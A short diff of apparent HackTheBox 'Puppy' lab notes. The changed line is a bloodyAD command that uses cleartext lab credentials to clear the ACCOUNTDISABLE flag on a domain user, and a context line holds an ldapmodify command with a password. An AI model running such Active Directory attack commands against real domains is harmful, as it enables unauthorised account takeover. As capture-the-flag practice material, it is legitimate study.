@@ -26,7 +26,7 @@ ldapmodify -x -H ldap://10.10.11.70 -D 'levi.james@PUPPY.HTB' -w 'KingofAkron202
 
 ## bloodyAD 
 ```sh
-bloodyAD -u 'levi.james' -p 'KingofAkron2025!' -d 'PUPPY.HTB' --target-user 'JAMIE WILLIAMSON' --enable
+bloodyAD -u 'ant.edwards' -p 'Antman2025!' -d 'PUPPY.HTB' --dc-ip 10.10.11.70 remove uac 'adam.silver' -f ACCOUNTDISABLE
 ```
 
 ## nxc
